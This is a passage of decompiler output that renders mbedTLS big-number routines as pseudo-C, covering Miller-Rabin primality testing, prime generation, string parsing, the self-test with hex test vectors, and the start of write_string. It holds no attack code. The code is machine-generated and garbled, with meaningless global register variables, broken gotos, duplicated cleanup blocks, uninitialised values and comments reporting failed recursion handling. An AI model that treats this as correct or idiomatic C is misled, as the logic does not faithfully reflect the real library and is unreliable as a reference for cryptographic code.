                                                        // branch -> 0x80599b5
                                                        while (true) {
                                                            // 0x80599b5
                                                            v73 = 0;
                                                            v71 = 0;
                                                            v63 = *(int32_t *)(a3 + 4);
                                                            // branch -> 0x80599b5
                                                            goto lab_0x80599b5_12;
                                                        }
                                                    }
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x8059989
                                            g5 = 0;
                                            v65 = 0;
                                            v74 = 0;
                                            v64 = *(int32_t *)(a3 + 4);
                                            v72 = 0;
                                            // branch -> 0x80599b5
                                          lab_0x80599b5_13:
                                            while (true) {
                                                // 0x80599b5
                                                v73 = v74;
                                                v71 = v72;
                                                v63 = v64;
                                                // branch -> 0x80599b5
                                                goto lab_0x80599b5_12;
                                            }
                                        } else {
                                            // 0x805977d
                                            g1 = v43;
                                            // branch -> 0x80594ff
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                            }
                        }
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // 0x80593b9
            // branch -> 0x80593be
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x80593b9
        // branch -> 0x80593be
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x80593b9
    // branch -> 0x80593be
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x8059bb0 - 0x8059fef
int32_t mpi_miller_rabin(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x8059bb3
    int32_t v2 = g7; // 0x8059bb4
    int32_t v3 = g3; // 0x8059bb5
    int32_t v4; // bp-40
    int32_t v5 = &v4; // 0x8059bbc_0
    g5 = v5;
    int32_t v6 = g1; // 0x8059bbf
    int32_t v7 = g6; // 0x8059bc2
    int32_t v8 = g4; // 0x8059bc5
    v4 = 1;
    int32_t v9 = 1; // bp-52
    int32_t v10 = 1; // bp-64
    int32_t v11 = 1; // bp-76
    int32_t v12 = 1; // bp-88
    int32_t v13 = mbedtls_mpi_sub_int(v5, v6, 1); // 0x8059c40
    g1 = v13;
    int32_t v14; // bp+055
    int32_t result; // 0x8059e15
    int32_t v15;
    if (v13 != 0) {
        // 0x8059d10
        g7 = &v11;
        result = v13;
        v14 = &v12;
        // branch -> 0x8059ca6
        // 0x8059ca6
        g1 = mbedtls_mpi_free((int32_t *)g5);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v9);
        g1 = mbedtls_mpi_free(&v10);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        g6 = v14;
        mbedtls_mpi_free((int32_t *)v14);
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v15;
        return result;
    }
    // 0x8059c4d
    g1 = 0;
    g3 = 0;
    int32_t v16 = &v9; // 0x8059c80_0
    int32_t v17 = mbedtls_mpi_copy((char *)&v9, (int32_t *)g5); // 0x8059c8d
    g1 = v17;
    if (v17 != 0) {
        // 0x8059c9a
        g7 = &v11;
        result = v17;
        v14 = &v12;
        // branch -> 0x8059ca6
        // 0x8059ca6
        g1 = mbedtls_mpi_free((int32_t *)g5);
        g1 = mbedtls_mpi_free((int32_t *)v16);
        g1 = mbedtls_mpi_free(&v10);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        g6 = v14;
        mbedtls_mpi_free((int32_t *)v14);
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v15;
        return result;
    }
    int32_t v18 = g3; // 0x8059d2b
    int32_t v19 = mbedtls_mpi_shift_r(v16, v18); // 0x8059d32
    g1 = v19;
    if (v19 != 0) {
        // 0x8059d3b
        g7 = &v11;
        result = v19;
        v14 = &v12;
        // branch -> 0x8059ca6
        // 0x8059ca6
        g1 = mbedtls_mpi_free((int32_t *)g5);
        g1 = mbedtls_mpi_free((int32_t *)v16);
        g1 = mbedtls_mpi_free(&v10);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        g6 = v14;
        mbedtls_mpi_free((int32_t *)v14);
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v15;
        return result;
    }
    uint32_t v20 = mbedtls_mpi_bitlen(v6, v18); // 0x8059d52
    if (v20 <= 1299) {
        // 0x8059d65
        if (v20 <= 849) {
            // 0x8059d73
            if (v20 <= 649) {
                // 0x8059d81
                if (v20 <= 349) {
                    // 0x8059d8f
                    if (v20 <= 249) {
                        // 0x8059d9d
                        // branch -> 0x8059dad
                    }
                }
            }
        }
    }
    int32_t v21 = &v11; // 0x8059db4_0
    g7 = v21;
    g4 = v7;
    g6 = v6;
    int32_t v22 = *(int32_t *)(v6 + 4); // 0x8059dcb
    int32_t v23 = mbedtls_mpi_fill_random(v21, 4 * v22, (int32_t (*)(int32_t, int32_t, int32_t))v7, v8); // 0x8059dd8
    g1 = v23;
    if (v23 == 0) {
        int32_t v24 = g5; // 0x8059de5
        if (mbedtls_mpi_cmp_mpi((int32_t *)g7, (int32_t *)v24) < 0) {
            // 0x8059e2c
            g1 = 0;
            g3 = 0;
            abort();
            // UNREACHABLE
        }
        int32_t v25 = mbedtls_mpi_bitlen(g7, v24); // 0x8059df8
        g3 = v25;
        int32_t v26 = mbedtls_mpi_bitlen(g5, v24); // 0x8059e02
        g6 = v26;
        result = mbedtls_mpi_shift_r(g7, v25 + 1 - v26);
        g1 = result;
        if (result == 0) {
            // 0x8059e2c
            g1 = 0;
            g3 = 0;
            abort();
            // UNREACHABLE
        }
        v14 = &v12;
        // branch -> 0x8059ca6
    } else {
        // 0x8059f2a
        result = v23;
        v14 = &v12;
        // branch -> 0x8059ca6
    }
    // 0x8059ca6
    g1 = mbedtls_mpi_free((int32_t *)g5);
    g1 = mbedtls_mpi_free((int32_t *)v16);
    g1 = mbedtls_mpi_free(&v10);
    g1 = mbedtls_mpi_free((int32_t *)g7);
    g6 = v14;
    mbedtls_mpi_free((int32_t *)v14);
    g1 = result;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v15;
    return result;
}

// Address range: 0x8059ff0 - 0x805a08f
int32_t mbedtls_mpi_is_prime(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x8059ff3
    int32_t v2; // bp-24
    int32_t v3 = &v2; // 0x8059ffa_0
    g3 = v3;
    v2 = 1;
    int32_t v4;
    if (mbedtls_mpi_cmp_int(v3, 0) == 0 || mbedtls_mpi_cmp_int(g3, 1) == 0) {
        // 0x805a024
        g1 = -14;
        // branch -> 0x805a029
        // 0x805a029
        g3 = v1;
        g2 = v4;
        return -14;
    }
    int32_t v5 = g3; // 0x805a04c
    if (mbedtls_mpi_cmp_int(v5, 2) == 0) {
        // 0x805a058
        g1 = 0;
        // branch -> 0x805a029
        // 0x805a029
        g3 = v1;
        g2 = v4;
        return 0;
    }
    // 0x805a05c
    g1 = v3;
    int32_t v6 = mpi_check_small_factors(v5); // 0x805a060
    g1 = v6;
    int32_t result; // 0x805a07a
    if (v6 == 0) {
        // 0x805a072
        g4 = a3;
        g1 = v3;
        g6 = a2;
        result = mpi_miller_rabin(v5, 2, 0);
        g1 = result;
        // branch -> 0x805a029
    } else {
        // 0x805a069
        if (v6 == 1) {
            // 0x805a058
            g1 = 0;
            result = 0;
            // branch -> 0x805a029
        } else {
            result = v6;
        }
    }
    // 0x805a029
    g3 = v1;
    g2 = v4;
    return result;
}

// Address range: 0x805a090 - 0x805a2df
int32_t mbedtls_mpi_gen_prime(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    g6 = a2;
    g3 = a1;
    g5 = a5;
    if (a2 >= 0x2001) {
        // 0x805a0b8
        return -4;
    }
    int32_t v1 = 1;
    int32_t v2 = &v1; // 0x805a0d4_0
    g7 = v2;
    int32_t v3 = a2 / 32; // 0x805a0f1
    g4 = v3;
    int32_t v4 = 4 * ((int32_t)(a2 % 32 != 0) + v3); // 0x805a0f6
    int32_t result = mbedtls_mpi_fill_random(a1, v4, (int32_t (*)(int32_t, int32_t, int32_t))a4, a5); // 0x805a107
    g1 = result;
    if (result != 0) {
        // 0x805a110
        mbedtls_mpi_free((int32_t *)g7);
        return result;
    }
    uint32_t v5 = mbedtls_mpi_bitlen(g3, v4); // 0x805a133
    if (v5 > a2) {
        int32_t result2 = mbedtls_mpi_shift_r(g3, v5 - a2 + 1); // 0x805a14b
        g1 = result2;
        if (result2 != 0) {
            // 0x805a110
            mbedtls_mpi_free((int32_t *)g7);
            return result2;
        }
    }
    // 0x805a157
    mbedtls_mpi_set_bit(g3, a2 - 1, 1);
    int32_t v6 = *(int32_t *)(g3 + 8); // 0x805a16e
    int32_t * v7 = (int32_t *)v6; // 0x805a171_0
    *v7 = *v7 | 1;
    int32_t result4; // 0x805a113
    if (a3 == 0) {
        // 0x805a17b
        g7 = a4;
        int32_t v8 = mbedtls_mpi_is_prime(g3, a4, g5); // 0x805a18b51
        g1 = v8;
        if (v8 != 0) {
            int32_t result3; // 0x805a11339
            while (true) {
                // 0x805a194
                if (v8 == -14) {
                    int32_t v9 = g3; // 0x805a1a1
                    int32_t v10 = mbedtls_mpi_add_int(v9, v9, 2); // 0x805a1a8
                    g1 = v10;
                    if (v10 == 0) {
                        int32_t v11 = mbedtls_mpi_is_prime(g3, g7, g5); // 0x805a18b
                        g1 = v11;
                        if (v11 == 0) {
                            result3 = 0;
                            // break -> 0x805a1b1
                            break;
                        }
                        v8 = v11;
                        // continue -> 0x805a194
                        continue;
                    } else {
                        result3 = v10;
                    }
                } else {
                    result3 = v8;
                }
            }
            // 0x805a1b1
            g7 = v2;
            // branch -> 0x805a110
            // 0x805a110
            mbedtls_mpi_free((int32_t *)g7);
            return result3;
        }
        // 0x805a1b1
        g7 = v2;
        result4 = 0;
        // branch -> 0x805a110
    } else {
        int32_t * v12 = (int32_t *)v6; // 0x805a1c0_0
        *v12 = *v12 | 2;
        g7 = v2;
        int32_t v13;
        int32_t v14 = mbedtls_mpi_mod_int(&v13, (int32_t *)g3, 3); // 0x805a1d8
        g1 = v14;
        if (v14 == 0) {
            g1 = v13;
            int32_t v15 = 8;
            int32_t v16; // 0x805a203
            int32_t v17; // 0x805a21b
            int32_t v18; // 0x805a270
            int32_t v19; // bp-76
            int32_t v20;
            int32_t v21; // 0x805a218
            int32_t v22; // 0x805a22a
            int32_t v23; // 0x805a2b832
            if (v13 != 0) {
                // 0x805a1f0
                if (v13 != 1) {
                    // 0x805a1f9
                    g7 = v2;
                    v16 = mbedtls_mpi_copy((char *)&v1, (int32_t *)g3);
                    g1 = v16;
                    result4 = v16;
                    if (v16 == 0) {
                        // 0x805a210
                        v21 = g7;
                        v19 = v21;
                        v17 = mbedtls_mpi_shift_r(v21, 1);
                        g1 = v17;
                        if (v17 == 0) {
                            v20 = 3;
                            v23 = 1;
                            while (true) {
                                // 0x805a26e
                                g1 = g3;
                                v18 = mpi_check_small_factors(v19);
                                g1 = v18;
                                v22 = v18;
                                if (v18 == 0) {
                                  lab_0x805a279:
                                    // 0x805a279
                                    g1 = g7;
                                    int32_t v24 = mpi_check_small_factors(v19); // 0x805a27b
                                    g1 = v24;
                                    if (v24 == 0) {
                                        // 0x805a284
                                        g6 = a4;
                                        g4 = g5;
                                        g1 = g3;
                                        int32_t v25 = mpi_miller_rabin(v19, v23, v20); // 0x805a28b
                                        g1 = v25;
                                        if (v25 == 0) {
                                            // 0x805a294
                                            g6 = a4;
                                            g4 = g5;
                                            g1 = g7;
                                            int32_t v26 = mpi_miller_rabin(v19, v23, v20); // 0x805a29b
                                            g1 = v26;
                                            if (v26 == 0) {
                                                // 0x805a110
                                                mbedtls_mpi_free((int32_t *)g7);
                                                return 0;
                                            }
                                            v22 = v26;
                                        } else {
                                            v22 = v25;
                                        }
                                    } else {
                                        v22 = v24;
                                    }
                                }
                              lab_0x805a22a:
                                // 0x805a22a
                                if (v22 == -14) {
                                    int32_t v27 = g3; // 0x805a23e
                                    int32_t v28 = mbedtls_mpi_add_int(v27, v27, 12); // 0x805a245
                                    g1 = v28;
                                    if (v28 == 0) {
                                        int32_t v29 = g7; // 0x805a25a
                                        v19 = v29;
                                        int32_t v30 = mbedtls_mpi_add_int(v29, v29, 6); // 0x805a261
                                        g1 = v30;
                                        if (v30 != 0) {
                                            result4 = v30;
                                            // break -> 0x805a110
                                            break;
                                        }
                                        v20 = 6;
                                        v23 = v29;
                                        // continue -> 0x805a26e
                                        continue;
                                    } else {
                                        result4 = v28;
                                    }
                                } else {
                                    result4 = v22;
                                }
                            }
                            // 0x805a110
                            mbedtls_mpi_free((int32_t *)g7);
                            return result4;
                        }
                        result4 = v17;
                    }
                    // 0x805a110
                    mbedtls_mpi_free((int32_t *)g7);
                    return result4;
                }
                v15 = 4;
            }
            int32_t v31 = g3; // 0x805a2b8
            int32_t v32 = mbedtls_mpi_add_int(v31, v31, v15); // 0x805a2bf
            g1 = v32;
            if (v32 == 0) {
                // 0x805a1f9
                g7 = v2;
                v16 = mbedtls_mpi_copy((char *)&v1, (int32_t *)g3);
                g1 = v16;
                if (v16 == 0) {
                    // 0x805a210
                    v21 = g7;
                    v19 = v21;
                    v17 = mbedtls_mpi_shift_r(v21, 1);
                    g1 = v17;
                    if (v17 == 0) {
                        v20 = v15;
                        v23 = 1;
                        while (true) {
                            // 0x805a26e
                            g1 = g3;
                            v18 = mpi_check_small_factors(v19);
                            g1 = v18;
                            if (v18 == 0) {
                                goto lab_0x805a279;
                            }
                            v22 = v18;
                            goto lab_0x805a22a;
                        }
                    } else {
                        result4 = v17;
                    }
                } else {
                    result4 = v16;
                }
            } else {
                result4 = v32;
            }
        } else {
            result4 = v14;
        }
    }
    // 0x805a110
    mbedtls_mpi_free((int32_t *)g7);
    return result4;
}

// Address range: 0x805a2e0 - 0x805a55f
int32_t mbedtls_mpi_read_string(char * a1, uint32_t a2, char * str) {
    int32_t v1 = g5; // 0x805a2e3
    int32_t v2 = g7; // 0x805a2e4
    int32_t v3 = g3; // 0x805a2e5
    g7 = a2;
    g3 = (int32_t)str;
    int32_t v4;
    if (a2 > 16) {
        // 0x805a440
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v4;
        return -4;
    }
    int32_t v5 = 1;
    uint32_t len = strlen(str); // 0x805a313
    int32_t v6; // bp+050
    if (g7 == 16) {
        // 0x805a44d
        if (len > 0x3fffffff) {
            // 0x805a44d
            // branch -> 0x805a440
            // 0x805a440
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v4;
            return -4;
        }
        int32_t v7 = mbedtls_mpi_grow((int32_t)a1, (char *)((int32_t)(len % 8 != 0) + len / 8 % 0x8000000)); // 0x805a46e
        g1 = v7;
        int32_t v8 = &v5; // 0x805a473_0
        int32_t result = v7; // 0x805a3f9
        v6 = v8;
        if (v7 == 0) {
            // 0x805a481
            g4 = (int32_t)a1;
            int32_t v9 = mbedtls_mpi_lset(a1, 0); // 0x805a48f
            g1 = v9;
            if (v9 == 0) {
                // 0x805a49c
                if (len != 0) {
                    int32_t v10 = len; // edx
                    int32_t v11 = g3; // 0x805a4b6
                    int32_t v12 = len; // 0x805a4c1
                    char v13 = 0;
                    // branch -> 0x805a4b9
                    while (true) {
                        // 0x805a4b9
                        if (v12 == 1) {
                            // 0x805a52a
                            g3 = v11;
                            if (*(char *)v11 == 45) {
                                // 0x805a532
                                g1 = 0;
                                *(int32_t *)a1 = -1;
                                v6 = v8;
                                // branch -> 0x805a3f6
                                // 0x805a3f6
                                g6 = v6;
                                mbedtls_mpi_free((int32_t *)v6);
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                g2 = v4;
                                return g1;
                            }
                        }
                        unsigned char v14 = *(char *)(v11 - 1 + v12); // 0x805a4c1
                        int32_t v15 = v14; // 0x805a4c1
                        int32_t v16 = v14; // 0x805a4c9
                        int32_t v17 = v15 - 65; // 0x805a4db
                        g3 = v17;
                        int32_t v18 = v16 - 55; // 0x805a4e1
                        int32_t v19 = v14 < 58 ? v16 - 48 : 255; // 0x805a4f359
                        if ((char)v17 < 6) {
                            // if_805a4e4_0_true
                            v19 = v18;
                            // branch -> after_if_805a4e4_0
                        }
                        int32_t v20 = v15 - 97; // 0x805a4e7
                        g4 = v20;
                        int32_t v21 = v16 - 87; // 0x805a4ea
                        if ((char)v20 < 6) {
                            // if_805a4f0_0_true
                            v19 = v21;
                            // branch -> after_if_805a4f0_0
                        }
                        // after_if_805a4f0_0
                        if (g7 <= v19) {
                            // 0x805a4f8
                            // branch -> 0x805a39d
                            // 0x805a39d
                            g1 = -6;
                            v6 = v8;
                            // branch -> 0x805a3f6
                            // 0x805a3f6
                            g6 = v6;
                            mbedtls_mpi_free((int32_t *)v6);
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v4;
                            return -6;
                        }
                        uint32_t v22 = (int32_t)v13;
                        int32_t v23 = *(int32_t *)((int32_t)a1 + 8); // 0x805a50f
                        uint32_t v24 = v22 % 8; // 0x805a515
                        int32_t v25 = 4 * v24; // 0x805a518
                        g4 = v25;
                        int32_t v26 = v19; // 0x805a51d
                        if (v24 != 0) {
                            // if_805a51b_0_true
                            v26 = v19 << v25;
                            // branch -> after_if_805a51b_0
                        }
                        int32_t * v27 = (int32_t *)(v23 + 4 * v22 / 8); // 0x805a51d_0
                        *v27 = *v27 | v26;
                        int32_t v28 = v10 - 1; // 0x805a51f
                        v10 = v28;
                        if (v28 == 0) {
                            // 0x805a549
                            g3 = v8;
                            g1 = 0;
                            v6 = v8;
                            // branch -> 0x805a3f6
                            // 0x805a3f6
                            g6 = v6;
                            mbedtls_mpi_free((int32_t *)v6);
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v4;
                            return 0;
                        }
                        // 0x805a524
                        v12 = v28;
                        v13 = v22 + 1;
                        // branch -> 0x805a4b9
                    }
                } else {
                    result = 0;
                    v6 = v8;
                }
            } else {
                result = v9;
                v6 = v8;
            }
        }
        // 0x805a3f6
        g6 = v6;
        mbedtls_mpi_free((int32_t *)v6);
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v4;
        return result;
    }
    int32_t result5 = mbedtls_mpi_lset(a1, 0); // 0x805a332
    int32_t v29 = &v5; // 0x805a337_0
    g4 = v29;
    if (result5 == 0) {
        // 0x805a348
        g4 = len;
        if (len != 0) {
            // 0x805a353
            g5 = 0;
            int32_t v30 = 0; // 0x805a365
            // branch -> 0x805a358
            while (true) {
                int32_t v31 = g3; // 0x805a35c
                if (v30 == 0) {
                    // 0x805a35c
                    if (*(char *)v31 == 45) {
                        // 0x805a430
                        *(int32_t *)a1 = -1;
                        // branch -> 0x805a3e7
                      lab_0x805a3e7_2:;
                        int32_t v32 = g5 + 1; // 0x805a3e7
                        g5 = v32;
                        if (len <= v32) {
                            // break -> 0x805a3f3
                            break;
                        }
                        v30 = v32;
                        // continue -> 0x805a358
                        continue;
                    }
                }
                unsigned char v33 = *(char *)(v31 + v30); // 0x805a365
                int32_t v34 = v33; // 0x805a369
                int32_t v35 = v33 > 57 ? 255 : v34 - 48; // 0x805a377
                g7 = v35;
                int32_t v36 = v34 - 55; // 0x805a383
                g4 = v36;
                if (v33 < 71) {
                    // if_805a38a_0_true
                    g7 = v36;
                    v35 = v36;
                    // branch -> after_if_805a38a_0
                }
                int32_t v37 = v34 - 87; // 0x805a390
                if ((char)((int32_t)v33 - 97) < 6) {
                    // if_805a395_0_true
                    g7 = v37;
                    v35 = v37;
                    // branch -> after_if_805a395_0
                }
                // after_if_805a395_0
                if (v35 >= a2) {
                    // 0x805a39d
                    g1 = -6;
                    v6 = v29;
                    // branch -> 0x805a3f6
                    // 0x805a3f6
                    g6 = v6;
                    mbedtls_mpi_free((int32_t *)v6);
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v4;
                    return -6;
                }
                // 0x805a3a8
                g4 = v29;
                int32_t result4 = mbedtls_mpi_mul_int(v29, (int32_t)a1, a2); // 0x805a3bc
                g1 = result4;
                if (result4 == 0) {
                    int32_t v38 = (int32_t)a1;
                    if (*(int32_t *)a1 == 1) {
                        int32_t result2 = mbedtls_mpi_add_int(v38, v29, g7); // 0x805a41e
                        g1 = result2;
                        if (result2 == 0) {
                            goto lab_0x805a3e7_2;
                        }
                        v6 = v29;
                        // 0x805a3f6
                        g6 = v6;
                        mbedtls_mpi_free((int32_t *)v6);
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v4;
                        return result2;
                    }
                    // 0x805a3cd
                    g4 = v29;
                    int32_t result3 = mbedtls_mpi_sub_int(v38, v29, g7); // 0x805a3de
                    g1 = result3;
                    if (result3 == 0) {
                        goto lab_0x805a3e7_2;
                    }
                    v6 = v29;
                    // 0x805a3f6
                    g6 = v6;
                    mbedtls_mpi_free((int32_t *)v6);
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v4;
                    return result3;
                }
                v6 = v29;
                // 0x805a3f6
                g6 = v6;
                mbedtls_mpi_free((int32_t *)v6);
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v4;
                return result4;
            }
            // 0x805a3f3
            g1 = result5;
            v6 = v29;
            // branch -> 0x805a3f6
            // 0x805a3f6
            g6 = v6;
            mbedtls_mpi_free((int32_t *)v6);
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v4;
            return result5;
        }
    }
    // 0x805a3f3
    g1 = result5;
    v6 = v29;
    // branch -> 0x805a3f6
    // 0x805a3f6
    g6 = v6;
    mbedtls_mpi_free((int32_t *)v6);
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v4;
    return result5;
}

// Address range: 0x805a6c0 - 0x805acff
int32_t mbedtls_mpi_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x805a6c3
    int32_t v2 = g7; // 0x805a6c4
    int32_t v3 = g3; // 0x805a6c5
    int32_t v4; // bp-40
    g7 = &v4;
    v4 = 1;
    int32_t v5; // bp-52
    int32_t v6 = &v5; // 0x805a6d6_0
    g5 = v6;
    v5 = 1;
    int32_t v7 = 1; // bp-64
    int32_t v8 = 1; // bp-76
    int32_t v9 = 1; // bp-88
    int32_t v10 = 1; // bp-100
    int32_t v11 = 1; // bp-112
    int32_t v12 = mbedtls_mpi_read_string((char *)&v4, 16, "EFE021C2645FD1DC586E69184AF4A31ED5F53E93B5F123FA41680867BA110131944FE7952E2517337780CB0DB80E61AAE7C8DDC6C5C6AADEB34EB38A2F40D5E6"); // 0x805a778
    g3 = v12;
    int32_t v13 = v12; // 0x805a8f852
    int32_t v14; // bp+046
    int32_t v15; // 0x805a9d0_0
    int32_t v16; // bp+043
    int32_t v17; // bp+042
    int32_t v18; // 0x805aa16_0
    int32_t result; // 0x805a81a
    int32_t result2; // 0x805a96a
    int32_t v19; // 0x805a7ae
    if (v12 == 0) {
        // 0x805a978
        g5 = v6;
        int32_t v20 = mbedtls_mpi_read_string((char *)&v5, 16, "B2E7EFD37075B9F03FF989C7C5051C2034D2A323810251127E7BF8625A4F49A5F3E27F4DA8BD59C47D6DAABA4C8127BD5B5C25763222FEFCCFC38B832366C29E"); // 0x805a98e
        g3 = v20;
        if (v20 == 0) {
            int32_t v21 = &v7; // 0x805a99d_0
            int32_t v22 = mbedtls_mpi_read_string((char *)&v7, 16, "0066A198186C18C10B2F5ED9B522752A9830B69916E535C8F047518A889A43A594B6BED27A168D31D4A52F88925AA8F5"); // 0x805a9b6
            g3 = v21;
            if (v22 == 0) {
                // 0x805a9c5
                v15 = &v8;
                int32_t v23 = mbedtls_mpi_mul_mpi(&v8, (int32_t *)g7, &v7); // 0x805a9d9
                g3 = v15;
                if (v23 == 0) {
                    int32_t v24 = &v10; // 0x805a9e8_0
                    mbedtls_mpi_read_string((char *)&v10, 16, "602AB7ECA597A3D6B56FF9829A5E8B859E857EA95A03512E2BAE7391688D264AA5663B0341DB9CCFD2C4C5F421FEC8148001B72E848A38CAE1C65F78E56ABDEFE12D3C039B8A02D6BE593F0BBBDA56F1ECF677152EF804370C1A305CAF3B5BF130879B56C61DE584A0F53A2447A51E");
                    g3 = v24;
                    v16 = v24;
                    v14 = v21;
                    v17 = &v9;
                    // branch -> 0x805a7ae
                    // 0x805a7ae
                    v18 = &v11;
                    v19 = a1;
                    g1 = v19;
                    if (v19 == 0) {
                        // 0x805a7b9
                        g1 = mbedtls_mpi_free((int32_t *)g7);
                        mbedtls_mpi_free((int32_t *)g5);
                        g1 = v14;
                        mbedtls_mpi_free((int32_t *)v14);
                        g1 = v15;
                        mbedtls_mpi_free((int32_t *)v15);
                        g1 = v17;
                        mbedtls_mpi_free((int32_t *)v17);
                        g1 = v16;
                        mbedtls_mpi_free((int32_t *)v16);
                        g1 = v18;
                        mbedtls_mpi_free(&v11);
                        if (a1 == 0) {
                            // 0x805a814
                            result = g3;
                            g1 = result;
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return result;
                        }
                    } else {
                        // 0x805a8f8
                        g1 = printf("Unexpected error, return code = %08X\n", v24);
                        g1 = mbedtls_mpi_free((int32_t *)g7);
                        mbedtls_mpi_free((int32_t *)g5);
                        g1 = v14;
                        mbedtls_mpi_free((int32_t *)v14);
                        g1 = v15;
                        mbedtls_mpi_free((int32_t *)v15);
                        g1 = v17;
                        mbedtls_mpi_free((int32_t *)v17);
                        g1 = v16;
                        mbedtls_mpi_free((int32_t *)v16);
                        g1 = v18;
                        mbedtls_mpi_free(&v11);
                        // branch -> 0x805a958
                    }
                    // 0x805a958
                    putchar(10);
                    result2 = g3;
                    g1 = result2;
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result2;
                }
            } else {
                // 0x805a78d
                v15 = v21;
                // branch -> 0x805a793
            }
            // 0x805a793
            v16 = &v10;
            v14 = v21;
            v17 = &v9;
            // branch -> 0x805a7ae
            // 0x805a7ae
            v18 = &v11;
            v19 = a1;
            g1 = v19;
            if (v19 == 0) {
                // 0x805a7b9
                g1 = mbedtls_mpi_free((int32_t *)g7);
                mbedtls_mpi_free((int32_t *)g5);
                g1 = v14;
                mbedtls_mpi_free((int32_t *)v14);
                g1 = v15;
                mbedtls_mpi_free((int32_t *)v15);
                g1 = v17;
                mbedtls_mpi_free((int32_t *)v17);
                g1 = v16;
                mbedtls_mpi_free((int32_t *)v16);
                g1 = v18;
                mbedtls_mpi_free(&v11);
                if (a1 == 0) {
                    // 0x805a814
                    result = g3;
                    g1 = result;
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
            } else {
                // 0x805a8f8
                g1 = printf("Unexpected error, return code = %08X\n", v15);
                g1 = mbedtls_mpi_free((int32_t *)g7);
                mbedtls_mpi_free((int32_t *)g5);
                g1 = v14;
                mbedtls_mpi_free((int32_t *)v14);
                g1 = v15;
                mbedtls_mpi_free((int32_t *)v15);
                g1 = v17;
                mbedtls_mpi_free((int32_t *)v17);
                g1 = v16;
                mbedtls_mpi_free((int32_t *)v16);
                g1 = v18;
                mbedtls_mpi_free(&v11);
                // branch -> 0x805a958
            }
            // 0x805a958
            putchar(10);
            result2 = g3;
            g1 = result2;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result2;
        }
        v13 = v20;
    }
    // 0x805a787
    // branch -> 0x805a78d
    // 0x805a78d
    // branch -> 0x805a793
    // 0x805a793
    v16 = &v10;
    v14 = &v7;
    v15 = &v8;
    v17 = &v9;
    // branch -> 0x805a7ae
    // 0x805a7ae
    v18 = &v11;
    v19 = a1;
    g1 = v19;
    if (v19 == 0) {
        // 0x805a7b9
        g1 = mbedtls_mpi_free((int32_t *)g7);
        mbedtls_mpi_free((int32_t *)g5);
        g1 = v14;
        mbedtls_mpi_free((int32_t *)v14);
        g1 = v15;
        mbedtls_mpi_free((int32_t *)v15);
        g1 = v17;
        mbedtls_mpi_free((int32_t *)v17);
        g1 = v16;
        mbedtls_mpi_free((int32_t *)v16);
        g1 = v18;
        mbedtls_mpi_free(&v11);
        if (a1 == 0) {
            // 0x805a814
            result = g3;
            g1 = result;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result;
        }
    } else {
        // 0x805a8f8
        g1 = printf("Unexpected error, return code = %08X\n", v13);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        mbedtls_mpi_free((int32_t *)g5);
        g1 = v14;
        mbedtls_mpi_free((int32_t *)v14);
        g1 = v15;
        mbedtls_mpi_free((int32_t *)v15);
        g1 = v17;
        mbedtls_mpi_free((int32_t *)v17);
        g1 = v16;
        mbedtls_mpi_free((int32_t *)v16);
        g1 = v18;
        mbedtls_mpi_free(&v11);
        // branch -> 0x805a958
    }
    // 0x805a958
    putchar(10);
    result2 = g3;
    g1 = result2;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result2;
}

// Address range: 0x805ad00 - 0x805aeef
int32_t mbedtls_mpi_write_string(int32_t * a1, int32_t a2, char * a3, uint32_t a4, int32_t * a5) {
    int32_t v1;
    char * v2 = (char *)v1; // bp-32
    int32_t v3 = (int32_t)a1;
    g3 = a2;
    g5 = v3;
    if (a2 >= 17) {
        // 0x805ad1c
        return -4;
    }
    // 0x805ad28
    int32_t v4;
    uint32_t v5 = mbedtls_mpi_bitlen(v3, v4); // 0x805ad2b
    int32_t v6 = g3; // 0x805ad30
    int32_t v7 = v5; // 0x805ad39
    if (v6 > 3) {
        // 0x805adb8
        if (v6 == 16) {
            // 0x805adc3
            v7 = v5 / 4;
            // branch -> 0x805ad39
        } else {
            v7 = v5 / 2;
        }
    }
    int32_t v8 = v7 + 3; // 0x805ad39
    g1 = v8;
    if (v8 > a4) {
        // 0x805aed9
        *a5 = v8;
        // branch -> 0x805ad1c
        // 0x805ad1c
        return -8;
    }
    int32_t v9 = (int32_t)a3;
    int32_t v10 = 1;
    v2 = a3;
    char * v11 = a3;
